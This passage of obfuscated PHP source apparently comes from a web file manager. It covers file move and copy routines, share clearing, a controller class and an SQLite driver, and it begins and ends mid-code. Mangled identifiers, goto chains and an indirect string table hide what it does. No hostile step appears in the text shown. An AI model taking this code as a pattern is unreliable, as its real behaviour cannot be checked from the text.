ï¡’Îµ; d‘èµí’ã‘: $f¥Ó±âë¥ = $this->sourceInfo($B­íÕïÊà); $eóŒ‘ô£¬ = $this->fileHistory($f¥Ó±âë¥, $eÜæ¯®İ›Œ[$A…ò§»å† [414]], $eÜæ¯®İ›Œ[$A…ò§»å† [78]]); if (!$eóŒ‘ô£¬) { Model($A…ò§»å† [417])->remove($eÜæ¯®İ›Œ[$A…ò§»å† [414]]); } goto CŒ´ØĞà»; CŒ´ØĞà»: $this->remove($c¤ °‚İÜİ, !1); $this->folderSizeReset($b›Ğ•Ù•ãÛ); Hook::trigger($A…ò§»å† [523], $A·ÀÊÜÚÓÚ); goto bäÖ¿·Ò©ğ; D ï¡’Îµ: } } $fÔÉÛø°«¹ = $Aáœ‹†÷Ïì ? $Aáœ‹†÷Ïì : $eÜæ¯®İ›Œ[$A…ò§»å† [28]]; goto cŒóáï¾¹ñ; CĞÏŞœ³À: Hook::trigger($A…ò§»å† [523], $A·ÀÊÜÚÓÚ); return $c²éá—Œ¦; goto c÷é…Ó¬ÀÛ; e¼¦À¤ë‹å: $this->sourceCacheClear(); if ($eÜæ¯®İ›Œ[$A…ò§»å† [366]] == $A…ò§»å† [84] && $AÅ†ìŠÕÑÓ) { $this->folderSizeResetChildren($c²éá—Œ¦); } Model($A…ò§»å† [164])->linkAdd($Fó§á»ØŠ[$A…ò§»å† [492]]); goto CÒÜŞ‡ò¨×; dÚ‰ø—È‹: if ($eÜæ¯®İ›Œ[$A…ò§»å† [366]] == $A…ò§»å† [84]) { $b“ÈŒªô„[] = $c¤ °‚İÜİ; } $this->updateModifyTime($b“ÈŒªô„); Model($A…ò§»å† [496])->eventMove($c¤ °‚İÜİ, $eÜæ¯®İ›Œ[$A…ò§»å† [456]], $b›Ğ•Ù•ãÛ); goto CĞÏŞœ³À; a§‚Ó»à‡é: $A·ÀÊÜÚÓÚ = $this->pathInfoMore($c¤ °‚İÜİ); if ($this->isParentOf($c¤ °‚İÜİ, $b›Ğ•Ù•ãÛ)) { return !1; } if (!$eÜæ¯®İ›Œ || !$fëê ÆÎéí || $fëê ÆÎéí[$A…ò§»å† [366]] != $A…ò§»å† [84]) { return !1; } goto aİÆ®ÁÒ¾; d’ëä¾ÚŒ˜: $A…ò§»å†  =& $_SERVER[‘®…¢À]; $eÜæ¯®İ›Œ = $this->sourceInfo($c¤ °‚İÜİ); $fëê ÆÎéí = $this->sourceInfo($b›Ğ•Ù•ãÛ); goto a§‚Ó»à‡é; c÷é…Ó¬ÀÛ: } private function _move($f¸’‰¼œá¹, $b—É¶«ä, $Bƒƒ‰õó§, &$C°ö†´˜õ›, $e†ğ£ØãÌ = '') { goto B„Û‰“—; Fª¬šà‹Ã: return $B±é—ìÁÀæ; goto d°äç­Šº–; D÷©¼öæº: $this->lockWriteStart($b—É¶«ä, $AËÁ‚ñîéö); if (!$Bè±¤Ûİó×) { return $this->_moveForce($f¸’‰¼œá¹, $b—É¶«ä, $AËÁ‚ñîéö); } $B±é—ìÁÀæ = $Bè±¤Ûİó×; goto F¤ù¾ª™é; D‰ª¢é±çº: $AËÁ‚ñîéö = $e†ğ£ØãÌ ? $e†ğ£ØãÌ : $EÀ«Âƒ›ï[$c‹çÆêöÎ[28]]; $Bè±¤Ûİó× = $this->fileNameExistCache($b—É¶«ä, $AËÁ‚ñîéö); $this->lockMoveStart($f¸’‰¼œá¹); goto D÷©¼öæº; B„Û‰“—: $c‹çÆêöÎ =& $_SERVER[‘®…¢À]; $EÀ«Âƒ›ï = $this->sourceInfo($f¸’‰¼œá¹); $b¾âŞÖõ = $EÀ«Âƒ›ï[$c‹çÆêöÎ[366]] == $c‹çÆêöÎ[84]; goto D‰ª¢é±çº; F¤ù¾ª™é: $fî‰ºƒ‰§ = !1; if ($b¾âŞÖõ) { if ($Bƒƒ‰õó§ == REPEAT_RENAME_FOLDER) { $AËÁ‚ñîéö = $this->fileNameAuto($b—É¶«ä, $AËÁ‚ñîéö, $Bƒƒ‰õó§, $b¾âŞÖõ); $B±é—ìÁÀæ = $this->_moveForce($f¸’‰¼œá¹, $b—É¶«ä, $AËÁ‚ñîéö); } else { if ($Bƒƒ‰õó§ == REPEAT_RENAME_FOLDER) { $Bƒƒ‰õó§ = REPEAT_RENAME; } $f‹½‰»Äµ = $this->_childrenListSelect($f¸’‰¼œá¹); foreach ($f‹½‰»Äµ as $Bƒƒ’Ê°ŸÈ) { $this->_move($Bƒƒ’Ê°ŸÈ[$c‹çÆêöÎ[365]], $Bè±¤Ûİó×, $Bƒƒ‰õó§, $C°ö†´˜õ›); } $fî‰ºƒ‰§ = !0; } } else { if ($Bƒƒ‰õó§ == REPEAT_SKIP) { $fî‰ºƒ‰§ = !0; } else { if ($Bƒƒ‰õó§ == REPEAT_RENAME || $Bƒƒ‰õó§ == REPEAT_RENAME_FOLDER) { $AËÁ‚ñîéö = $this->fileNameAuto($b—É¶«ä, $AËÁ‚ñîéö, $Bƒƒ‰õó§, $b¾âŞÖõ); $B±é—ìÁÀæ = $this->_moveForce($f¸’‰¼œá¹, $b—É¶«ä, $AËÁ‚ñîéö); } else { if ($Bƒƒ‰õó§ == REPEAT_REPLACE) { $fÊ‰î¦…—© = $this->sourceInfoCache($Bè±¤Ûİó×); $f¾‘öÀœ¥ = $this->fileHistory($fÊ‰î¦…—©, $EÀ«Âƒ›ï[$c‹çÆêöÎ[414]], $EÀ«Âƒ›ï[$c‹çÆêöÎ[78]]); if ($f¾‘öÀœ¥) { $C°ö†´˜õ›[$c‹çÆêöÎ[492]][] = $EÀ«Âƒ›ï[$c‹çÆêöÎ[414]]; } else { $fî‰ºƒ‰§ = !0; } } } } } if ($fî‰ºƒ‰§ && !$C°ö†´˜õ›[$c‹çÆêöÎ[524]]) { $C°ö†´˜õ›[$c‹çÆêöÎ[524]] = !0; } goto Fª¬šà‹Ã; d°äç­Šº–: } private function _moveForce($F“½Ì™¨¸, $DÓÁ—ôåĞ, $f½¤™Œ…) { goto bŒùÙŸ¨Í; Bñ“–İ—ö¸: if ($F¹õïÇÌ×­) { $c¤ßã’Ø = array($c¨äåôóÌˆ[516] => array($c¨äåôóÌˆ[474], $BíÍòíšæµ[$c¨äåôóÌˆ[454]] . $BíÍòíšæµ[$c¨äåôóÌˆ[365]] . $c¨äåôóÌˆ[475])); $dšõÖˆÎ”¢ = $BíÍòíšæµ[$c¨äåôóÌˆ[454]] . $BíÍòíšæµ[$c¨äåôóÌˆ[365]] . $c¨äåôóÌˆ[47]; $EÕš©…òÎ÷ = $Cñå´œ«Éß[$c¨äåôóÌˆ[454]] . $Cñå´œ«Éß[$c¨äåôóÌˆ[365]] . $c¨äåôóÌˆ[47] . $BíÍòíšæµ[$c¨äåôóÌˆ[365]] . $c¨äåôóÌˆ[47]; $BˆŠÁ¹Á = array($c¨äåôóÌˆ[516] => array($c¨äåôóÌˆ[525], "\162\x65\x70\x6c\141\x63\x65\x28\x70\x61\x72\x65\156\164\114\145\166\145\x6c\54\47{$dšõÖˆÎ”¢}\x27\x2c\47{$EÕš©…òÎ÷}\x27\x29"), $c¨äåôóÌˆ[512] => $Cñå´œ«Éß[$c¨äåôóÌˆ[367]], $c¨äåôóÌˆ[513] => $Cñå´œ«Éß[$c¨äåôóÌˆ[451]]); if ($FÛ¥ÉÓæÏÂ) { $BˆŠÁ¹Á[$c¨äåôóÌˆ[391]] = 0; } $this->where($c¤ßã’Ø)->data($BˆŠÁ¹Á)->save(); } $this->where(array($c¨äåôóÌˆ[379] => $F“½Ì™¨¸))->data($B½Ö„ÎØÖÍ)->save(); return $F“½Ì™¨¸; goto FÃ†‘–Ãë±; E‚è—‘Øº¶: $F¹õïÇÌ×­ = $BíÍòíšæµ[$c¨äåôóÌˆ[366]] == $c¨äåôóÌˆ[84]; $B½Ö„ÎØÖÍ = array($c¨äåôóÌˆ[364] => $Cñå´œ«Éß[$c¨äåôóÌˆ[365]], $c¨äåôóÌˆ[516] => $Cñå´œ«Éß[$c¨äåôóÌˆ[454]] . $Cñå´œ«Éß[$c¨äåôóÌˆ[365]] . $c¨äåôóÌˆ[47], $c¨äåôóÌˆ[512] => $Cñå´œ«Éß[$c¨äåôóÌˆ[367]], $c¨äåôóÌˆ[513] => $Cñå´œ«Éß[$c¨äåôóÌˆ[451]], $c¨äåôóÌˆ[515] => USER_ID, $c¨äåôóÌˆ[382] => $f½¤™Œ…); $A­¡Ì˜£ÊÜ = $BíÍòíšæµ[$c¨äåôóÌˆ[367]] == SourceModel::TYPE_GROUP && $Cñå´œ«Éß[$c¨äåôóÌˆ[367]] == SourceModel::TYPE_GROUP && $BíÍòíšæµ[$c¨äåôóÌˆ[451]] == $Cñå´œ«Éß[$c¨äåôóÌˆ[451]]; goto Fºœ§Õ„óä; Fºœ§Õ„óä: if (!$A­¡Ì˜£ÊÜ) { Model($c¨äåôóÌˆ[449])->authClear($F“½Ì™¨¸); } $FÛ¥ÉÓæÏÂ = $BíÍòíšæµ[$c¨äåôóÌˆ[392]] == $c¨äåôóÌˆ[84] && $Cñå´œ«Éß[$c¨äåôóÌˆ[392]] != $c¨äåôóÌˆ[84]; if ($FÛ¥ÉÓæÏÂ) { $B½Ö„ÎØÖÍ[$c¨äåôóÌˆ[391]] = 0; } goto Bñ“–İ—ö¸; bŒùÙŸ¨Í: $c¨äåôóÌˆ =& $_SERVER[‘®…¢À]; $BíÍòíšæµ = $this->sourceInfo($F“½Ì™¨¸); $Cñå´œ«Éß = $this->sourceInfo($DÓÁ—ôåĞ); goto E‚è—‘Øº¶; FÃ†‘–Ãë±: } private function clearShare($bÂÂ´Øùæ, $fšêÅ¶®’Í) { goto aÄâÑÁ“†È; a¥¿‰Š‹§„: if ($cæÉÆÉÔ«[$cÒƒŞ·µä[451]] == $B­ò‘Ìæ«Æ[$cÒƒŞ·µä[451]] && $cæÉÆÉÔ«[$cÒƒŞ·µä[367]] == $cÒƒŞ·µä[526]) { return; } $AÍÜíÅË‘î = array($cÒƒŞ·µä[454] => array($cÒƒŞ·µä[474], $cæÉÆÉÔ«[$cÒƒŞ·µä[454]] . $bÂÂ´Øùæ . $cÒƒŞ·µä[475])); $F„ÆÒŸÏÑ = $this->field($cÒƒŞ·µä[379])->where($AÍÜíÅË‘î)->getField($cÒƒŞ·µä[365], !0); goto DÃ›¥ñ¬ë; DÃ›¥ñ¬ë: if (!$F„ÆÒŸÏÑ) { return; } $AÍÜíÅË‘î = array($cÒƒŞ·µä[365] => array($cÒƒŞ·µä[7], $F„ÆÒŸÏÑ), $cÒƒŞ·µä[443] => 1); $aÙÒ¯Ó¤‰ß = Model($cÒƒŞ·µä[527])->field($cÒƒŞ·µä[436])->where($AÍÜíÅË‘î)->select(); goto f¾â…ÑØ¶ó; cçƒœªª—…: Model($cÒƒŞ·µä[527])->where($AÍÜíÅË‘î)->save(array($cÒƒŞ·µä[443] => 0)); Model($cÒƒŞ·µä[528])->where($AÍÜíÅË‘î)->delete(); goto B–…Î¬èÌù; f¾â…ÑØ¶ó: if (!$aÙÒ¯Ó¤‰ß) { return; } $aÙÒ¯Ó¤‰ß = array_to_keyvalue($aÙÒ¯Ó¤‰ß, $cÒƒŞ·µä[33], $cÒƒŞ·µä[436]); $AÍÜíÅË‘î = array($cÒƒŞ·µä[436] => array($cÒƒŞ·µä[7], $aÙÒ¯Ó¤‰ß)); goto cçƒœªª—…; aÄâÑÁ“†È: $cÒƒŞ·µä =& $_SERVER[‘®…¢À]; $cæÉÆÉÔ« = $this->sourceInfo($bÂÂ´Øùæ); $B­ò‘Ìæ«Æ = $this->sourceInfo($fšêÅ¶®’Í); goto a¥¿‰Š‹§„; B–…Î¬èÌù: } public function copyFolderFromIO($d©“±ÉŸË, $f­ºœ¶ãã™, $B×öÅ±œÀô, $DÂ¯³Ãëó, $f…±ÀÊÊâˆ, $EÈÓ·¡§ø = false) { goto aô¼ƒŸöõŞ; aô¼ƒŸöõŞ: $C°ó©ÙğÏß =& $_SERVER[‘®…¢À]; $a„à§¥¼Áğ = array($C°ó©ÙğÏß[493] => array(), $C°ó©ÙğÏß[494] => array(), $C°ó©ÙğÏß[492] => array(), $C°ó©ÙğÏß[529] => array()); $b¢Â›ñßä = $EÈÓ·¡§ø ? $EÈÓ·¡§ø : $d©“±ÉŸË->getPathName($d©“±ÉŸË->pathThis($f­ºœ¶ãã™)); goto A÷İÆ–´è; eö¾¢Ï‡È‘: Model($C°ó©ÙğÏß[495])->addAll($a„à§¥¼Áğ[$C°ó©ÙğÏß[493]], array(), !0); Model($C°ó©ÙğÏß[496])->eventCopy($C›­ÖİÒÀ‹); $this->saveAll($a„à§¥¼Áğ[$C°ó©ÙğÏß[494]]); goto FŞÎ²ôÄÖŠ; FŞÎ²ôÄÖŠ: Model($C°ó©ÙğÏß[417])->linkAdd($a„à§¥¼Áğ[$C°ó©ÙğÏß[492]]); Model($C°ó©ÙğÏß[417])->remove($a„à§¥¼Áğ[$C°ó©ÙğÏß[529]]); $this->folderSizeReset($B×öÅ±œÀô); goto eèŸ‚áÍâŒ; e¾Å´ÅËß·: if ($eÈæ‘Û›‘) { $this->_childrenAllMake($eÈæ‘Û›‘); } Hook::trigger($C°ó©ÙğÏß[530]); $this->_copyChildTo($d©“±ÉŸË, $f­ºœ¶ãã™, $C›­ÖİÒÀ‹, $DÂ¯³Ãëó, $a„à§¥¼Áğ, $f…±ÀÊÊâˆ); goto e¥ÉåğëÕ; e¥ÉåğëÕ: Hook::trigger($C°ó©ÙğÏß[531]); if ($C›­ÖİÒÀ‹) { $this->folderSizeResetChildren($C›­ÖİÒÀ‹); } $this->_childrenListClear(); goto eö¾¢Ï‡È‘; eèŸ‚áÍâŒ: $this->updateModifyTime($B×öÅ±œÀô); return $C›­ÖİÒÀ‹; goto eÉ¬îÖÍ·Ó; A÷İÆ–´è: $eÈæ‘Û›‘ = $this->fileNameExist($B×öÅ±œÀô, $b¢Â›ñßä); $C›­ÖİÒÀ‹ = $this->mkdir($B×öÅ±œÀô, $b¢Â›ñßä, $DÂ¯³Ãëó); if (!$eÈæ‘Û›‘ || $DÂ¯³Ãëó == REPEAT_RENAME_FOLDER) { $DÂ¯³Ãëó = !1; } goto e¾Å´ÅËß·; eÉ¬îÖÍ·Ó: } private function _copyChildTo($BÒğÚ»²µ, $eºĞ–Èà‘ß, $b§¸ğ–ÔÍ†, $cˆ‘¿›é‘, &$d†¸éÍ®Ş, $F£“³ğß¼) { goto Dİ´™Ğ; Dİ´™Ğ: $aæù–ÂˆÆ =& $_SERVER[‘®…¢À]; $fã™õæ  = $this->sourceInfoCache($b§¸ğ–ÔÍ†); $Eğ©®·âœ = $BÒğÚ»²µ->listPath($eºĞ–Èà‘ß, !1, !0); goto eòÇö‘‰¬¾; Dé«ãĞß–ô: $Fãç÷ÁóÍ = $this->_childrenList($b§¸ğ–ÔÍ†); $Fãç÷ÁóÍ = array_to_keyvalue($Fãç÷ÁóÍ, $aæù–ÂˆÆ[28]); foreach ($eˆà—‰Ôê· as $Cê¢ã¡†ø°) { $FŸÓœ°¸ÊÀ = $Fãç÷ÁóÍ[$Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]]]; $cÇâ¯çœÈê = $FŸÓœ°¸ÊÀ[$aæù–ÂˆÆ[365]]; $this->_copyApplyMeta($FŸÓœ°¸ÊÀ, $d†¸éÍ®Ş); if ($Cê¢ã¡†ø°[$aæù–ÂˆÆ[29]] == $aæù–ÂˆÆ[77]) { $Cê¢ã¡†ø°[$aæù–ÂˆÆ[76]] = $BÒğÚ»²µ->getPathInner($Cê¢ã¡†ø°[$aæù–ÂˆÆ[76]]); $this->_copyChildTo($BÒğÚ»²µ, $Cê¢ã¡†ø°[$aæù–ÂˆÆ[76]], $cÇâ¯çœÈê, $cˆ‘¿›é‘, $d†¸éÍ®Ş, $F£“³ğß¼); } } goto A·ÓôÛÀ‡İ; eòÇö‘‰¬¾: $eˆà—‰Ôê· = array_merge($Eğ©®·âœ[$aæù–ÂˆÆ[74]], $Eğ©®·âœ[$aæù–ÂˆÆ[75]]); $eòïĞ¥ŒÚŞ = $this->_addFiles($BÒğÚ»²µ, $Eğ©®·âœ[$aæù–ÂˆÆ[74]], $F£“³ğß¼); $Då‘“˜ó¦ = array(); goto cµÔ‚ÏöÚò; cµÔ‚ÏöÚò: foreach ($eˆà—‰Ôê· as &$Cê¢ã¡†ø°) { goto eØ–„ñ¨; eØ–„ñ¨: if (isset($eòïĞ¥ŒÚŞ[$Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]]])) { $Cê¢ã¡†ø° = $eòïĞ¥ŒÚŞ[$Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]]]; } $Cê¢ã¡†ø°[$aæù–ÂˆÆ[366]] = $Cê¢ã¡†ø°[$aæù–ÂˆÆ[29]] == $aæù–ÂˆÆ[77]; $Cê¢ã¡†ø°[$aæù–ÂˆÆ[368]] = _get($Cê¢ã¡†ø°, $aæù–ÂˆÆ[157], $aæù–ÂˆÆ[33]); goto e¾Ëªä—; e¾Ëªä—: $Cê¢ã¡†ø°[$aæù–ÂˆÆ[78]] = _get($Cê¢ã¡†ø°, $aæù–ÂˆÆ[78], 0); $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]] = _get($Cê¢ã¡†ø°, $aæù–ÂˆÆ[414], 0); if (!isset($Cê¢ã¡†ø°[$aæù–ÂˆÆ[532]]) && $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]]) { $d†¸éÍ®Ş[$aæù–ÂˆÆ[529]][] = $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]]; } goto Cƒƒ»”ß™Ó; Cƒƒ»”ß™Ó: if ($cˆ‘¿›é‘) { $a®ğŠô‰‚ = $this->fileNameExistCache($b§¸ğ–ÔÍ†, $Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]]); if ($a®ğŠô‰‚) { if ($Cê¢ã¡†ø°[$aæù–ÂˆÆ[366]] || $cˆ‘¿›é‘ == REPEAT_SKIP) { continue; } if ($cˆ‘¿›é‘ == REPEAT_REPLACE) { $FŸÓœ°¸ÊÀ = $this->sourceInfoCache($a®ğŠô‰‚); $b‡Å¨– ¾² = $this->fileHistory($FŸÓœ°¸ÊÀ, $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]], $Cê¢ã¡†ø°[$aæù–ÂˆÆ[78]]); if ($b‡Å¨– ¾²) { $d†¸éÍ®Ş[$aæù–ÂˆÆ[492]][] = $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]]; } continue; } else { if ($cˆ‘¿›é‘ == REPEAT_RENAME) { $Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]] = $this->fileNameAutoCache($b§¸ğ–ÔÍ†, $Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]], $cˆ‘¿›é‘, !1); } } } } if (!$Cê¢ã¡†ø°[$aæù–ÂˆÆ[366]] && $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]]) { $d†¸éÍ®Ş[$aæù–ÂˆÆ[492]][] = $Cê¢ã¡†ø°[$aæù–ÂˆÆ[414]]; } $Då‘“˜ó¦[] = $this->_makeItemData($Cê¢ã¡†ø°, $fã™õæ , $Cê¢ã¡†ø°[$aæù–ÂˆÆ[28]]); goto C©ä«Ï®²; C©ä«Ï®²: } unset($Cê¢ã¡†ø°); if (!empty($Då‘“˜ó¦)) { $this->addAll($Då‘“˜ó¦); } goto Dé«ãĞß–ô; A·ÓôÛÀ‡İ: } private function _addFiles($fŒÁßóó—, $Dòö‡Ë‚êÜ, $d—×—±¥Âí) { goto dºÒÂ½óÎ½; dºÒÂ½óÎ½: $f¶—ëê…·¥ =& $_SERVER[‘®…¢À]; if (!$Dòö‡Ë‚êÜ || count($Dòö‡Ë‚êÜ) == 0) { return array(); } $B÷ĞâÖä¥Ë = array(); goto e„ìªŞÆ¢Ô; F£ÔĞƒ­Ô·: return $b”‹³Èê‘¸; goto d›Ë …•„œ; A„…¬¦¥‹: foreach ($a°­õÒì‹¤ as $fš‚Öï‡ƒ) { if (!isset($B÷ĞâÖä¥Ë[$fš‚Öï‡ƒ[$f¶—ëê…·¥[160]]])) { continue; } $F±¢ÌÌˆ¢ =& $B÷ĞâÖä¥Ë[$fš‚Öï‡ƒ[$f¶—ëê…·¥[160]]]; foreach ($F±¢ÌÌˆ¢ as &$D»ÎÉ˜ªå) { $D»ÎÉ˜ªå[$f¶—ëê…·¥[414]] = $fš‚Öï‡ƒ[$f¶—ëê…·¥[414]]; } unset($D»ÎÉ˜ªå); } $b”‹³Èê‘¸ = array(); foreach ($Dòö‡Ë‚êÜ as $Bè¸·‹ï¦) { $b”‹³Èê‘¸[$Bè¸·‹ï¦[$f¶—ëê…·¥[28]]] = $Bè¸·‹ï¦; } goto F£ÔĞƒ­Ô·; D²õ÷íê„‚: $cà…°Õ¦± = array($f¶—ëê…·¥[160] => array($f¶—ëê…·¥[7], array_keys($B÷ĞâÖä¥Ë))); $a°­õÒì‹¤ = $Eáé­¿¤Ü->where($cà…°Õ¦±)->select(); $a°­õÒì‹¤ = $a°­õÒì‹¤ ? $a°­õÒì‹¤ : array(); goto A„…¬¦¥‹; bÊ­»ª¿Ú: $dš“ê¡Ê = array(); foreach ($Dòö‡Ë‚êÜ as $F°Œõáãšù) { if (isset($F°Œõáãšù[$f¶—ëê…·¥[532]]) && $F°Œõáãšù[$f¶—ëê…·¥[532]]) { continue; } $eàÏœÔƒšÌ = $fŒÁßóó—->getPathInner($F°Œõáãšù[$f¶—ëê…·¥[76]]); $b­Š–ÌŞ†Ú = $Eáé­¿¤Ü->addFileMake($eàÏœÔƒšÌ, $F°Œõáãšù[$f¶—ëê…·¥[78]], $F°Œõáãšù[$f¶—ëê…·¥[161]], $F°Œõáãšù[$f¶—ëê…·¥[160]], $F°Œõáãšù[$f¶—ëê…·¥[28]], $d—×—±¥Âí); $dš“ê¡Ê[] = $b­Š–ÌŞ†Ú; } $Eáé­¿¤Ü->addAll($dš“ê¡Ê); goto D²õ÷íê„‚; A¯ªé÷: $a°­õÒì‹¤ = $Eáé­¿¤Ü->where($cà…°Õ¦±)->select(); $a°­õÒì‹¤ = $a°­õÒì‹¤ ? $a°­õÒì‹¤ : array(); foreach ($a°­õÒì‹¤ as $fš‚Öï‡ƒ) { if (!isset($B÷ĞâÖä¥Ë[$fš‚Öï‡ƒ[$f¶—ëê…·¥[160]]])) { continue; } $eÌÄ±‰âìÊ = $B÷ĞâÖä¥Ë[$fš‚Öï‡ƒ[$f¶—ëê…·¥[160]]]; foreach ($eÌÄ±‰âìÊ as &$D»ÎÉ˜ªå) { $D»ÎÉ˜ªå[$f¶—ëê…·¥[414]] = $fš‚Öï‡ƒ[$f¶—ëê…·¥[414]]; $D»ÎÉ˜ªå[$f¶—ëê…·¥[532]] = !0; } unset($D»ÎÉ˜ªå); } goto bÊ­»ª¿Ú; e„ìªŞÆ¢Ô: foreach ($Dòö‡Ë‚êÜ as &$D»ÎÉ˜ªå) { goto CŸšïµã™Õ; Eğ’”¤Ó©ö: if (count($B÷ĞâÖä¥Ë[$cØö»ä¬Ç]) > 1) { $D»ÎÉ˜ªå[$f¶—ëê…·¥[532]] = !0; } goto aÖÕ§ø£šµ; CŸšïµã™Õ: Hook::trigger($f¶—ëê…·¥[533], $D»ÎÉ˜ªå); $D»ÎÉ˜ªå[$f¶—ëê…·¥[76]] = $fŒÁßóó—->getPathInner($D»ÎÉ˜ªå[$f¶—ëê…·¥[76]]); $eËáÇÂ²æÆ = $fŒÁßóó—->hashSimple($D»ÎÉ˜ªå[$f¶—ëê…·¥[76]]); goto e›Ìğ÷Ë¸Ò; e›Ìğ÷Ë¸Ò: $cØö»ä¬Ç = $fŒÁßóó—->hashMd5($D»ÎÉ˜ªå[$f¶—ëê…·¥[76]]); if (strlen($cØö»ä¬Ç) > 10 && !isset($B÷ĞâÖä¥Ë[$cØö»ä¬Ç])) { $B÷ĞâÖä¥Ë[$cØö»ä¬Ç] = array(); } $D»ÎÉ˜ªå[$f¶—ëê…·¥[161]] = $eËáÇÂ²æÆ; goto cÎ¶œ£»…×; cÎ¶œ£»…×: $D»ÎÉ˜ªå[$f¶—ëê…·¥[160]] = $cØö»ä¬Ç; Hook::trigger($f¶—ëê…·¥[534], $D»ÎÉ˜ªå); $B÷ĞâÖä¥Ë[$cØö»ä¬Ç][] =& $D»ÎÉ˜ªå; goto Eğ’”¤Ó©ö; aÖÕ§ø£šµ: } $cà…°Õ¦± = array($f¶—ëê…·¥[160] => array($f¶—ëê…·¥[7], array_keys($B÷ĞâÖä¥Ë))); $Eáé­¿¤Ü = Model($f¶—ëê…·¥[535]); goto A¯ªé÷; d›Ë …•„œ: } } define($_SERVER[‘®…¢À][536], $_SERVER[‘®…¢À][537]); goto b£¨ŒÛ”; BÏ–Ê¹ù…§: define($_SERVER[‘®…¢À][224], 2); define($_SERVER[‘®…¢À][225], 3); define($_SERVER[‘®…¢À][226], 1); goto a†ØÉšÍ¶Õ; AÉ™Êëé¿˜: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e–ïƒÁ¡è; e–ïƒÁ¡è: $FÚØÕŠË—À =& $_SERVER[‘®…¢À]; global $in, $config; $this->config =& $config; goto Eçó»‡²®®; BÑõ†®ÎŒ¡: $this->tpl = TEMPLATE . MOD . $FÚØÕŠË—À[8]; $this->_classObjectID = mt_rand(0, 10000); goto B­Å†¢õÌï; Eçó»‡²®®: $this->in =& $in; $this->values[$FÚØÕŠË—À[6]] =& $config; $this->values[$FÚØÕŠË—À[7]] =& $in; goto BÑõ†®ÎŒ¡; B­Å†¢õÌï: } public function loadClass($d¡š÷ãš™Ö) { if (1 === func_num_args()) { $this->{$d¡š÷ãš™Ö} = new $d¡š÷ãš™Ö(); } else { $C¹‡ÏáñˆÜ = new ReflectionClass($d¡š÷ãš™Ö); $B”ãöå„° = func_get_args(); array_shift($B”ãöå„°); $this->{$d¡š÷ãš™Ö} = $C¹‡ÏáñˆÜ->newInstanceArgs($B”ãöå„°); } return $this->{$d¡š÷ãš™Ö}; } protected function assign($b”ÓÄ¤¿‹, $Dçõë¾âÑª) { $this->values[$b”ÓÄ¤¿‹] = $Dçõë¾âÑª; } protected function display($D‹¥°ŸÇ¼Î) { ob_end_clean(); extract($this->values); require $this->tpl . $D‹¥°ŸÇ¼Î; } } class DbSqliteBase extends Db { public function __construct($C»Íµ¯ÇŠ = '') { $EùÍŞÕèÌ¢ =& $_SERVER[‘®…¢À]; if (!extension_loaded($EùÍŞÕèÌ¢[9])) { think_exception(think_lang($EùÍŞÕèÌ¢[10]) . $EùÍŞÕèÌ¢[11]); } if (!empty($C»Íµ¯ÇŠ)) { if (!isset($C»Íµ¯ÇŠ[$EùÍŞÕèÌ¢[12]])) { $C»Íµ¯ÇŠ[$EùÍŞÕèÌ¢[12]] = 438; } $this->config = $C»Íµ¯ÇŠ; if (empty($this->config[$EùÍŞÕèÌ¢[13]])) { $this->config[$EùÍŞÕèÌ¢[13]] = array(); } } } public function connect($f¼ìÍ·…Û… = '', $f‹’¸Ñõ¦ = 0) { $E«›ôø¿ÁÊ =& $_SERVER[‘®…¢À]; if (!isset($this->linkID[$f‹’¸Ñõ¦])) { goto dœŠÊ²Ñ®š; C÷Åªá°Ü: $this->linkID[$f‹’¸Ñõ¦] = $C¿–Ğ¹¡“â($f¼ìÍ·…Û…[$E«›ôø¿ÁÊ[17]], $f¼ìÍ·…Û…[$E«›ôø¿ÁÊ[12]]); if (!$this->linkID[$f‹’¸Ñõ¦]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto E¸ÕØÍÀÛà; dœŠÊ²Ñ®š: if (empty($f¼ìÍ·…Û…)) { $f¼ìÍ·…Û… = $this->config; } $D‚µ–š÷¤– = !empty($f¼ìÍ·…Û…[$E«›ôø¿ÁÊ[13]][$E«›ôø¿ÁÊ[14]]) ? $f¼ìÍ·…Û…[$E«›ôø¿ÁÊ[13]][$E«›ôø¿ÁÊ[14]] : $this->pconnect; $C¿–Ğ¹¡“â = $D‚µ–š÷¤– ? $E«›ôø¿ÁÊ[15] : $E«›ôø¿ÁÊ[16]; goto C÷Åªá°Ü; E¸ÕØÍÀÛà: @sqlite_busy_timeout($this->linkID[$f‹’¸Ñõ¦], 30000); if (1 != think_config($E«›ôø¿ÁÊ[18])) { unset($this->config); } goto fì¾¾»ó¬; fì¾¾»ó¬: } return $this->linkID[$f‹’¸Ñõ¦]; } public function free() { $this->queryID = null; } public function query($A™Çñ’‚¦) { goto BŞç‹ˆ¶°æ; BŞç‹ˆ¶°æ: $BÙ÷ã®¿Óí =& $_SERVER[‘®…¢À]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¾ÄÃØĞ¦; AòÃŒÇ¤Öß: think_status($BÙ÷ã®¿Óí[20]); $this->queryID = sqlite_query($this->_linkID, $A™Çñ’‚¦); $this->debug(); goto d –Ü§ÒË; d –Ü§ÒË: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Eº·¢ª¯™ô = $this->getAll(); return $Eº·¢ª¯™ô; } goto DÙáŸÈŒ²; E¾ÄÃØĞ¦: $this->queryStr = $A™Çñ’‚¦; if ($this->queryID) { $this->free(); } think_action_status($BÙ÷ã®¿Óí[19], 1); goto AòÃŒÇ¤Öß; DÙáŸÈŒ²: } public function execute($dò‰Èê»í) { goto bÍ®Ä¬¢‡; Dã›ƒÙ¯: $this->queryStr = $dò‰Èê»í; if ($this->queryID) { $this->free(); } think_action_status($F¤×áç‰ÉÚ[21], 1); goto aõ‰áÎëŞ; aõ‰áÎëŞ: think_status($F¤×áç‰ÉÚ[20]); $D×Î£„¶„ = sqlite_exec($this->_linkID, 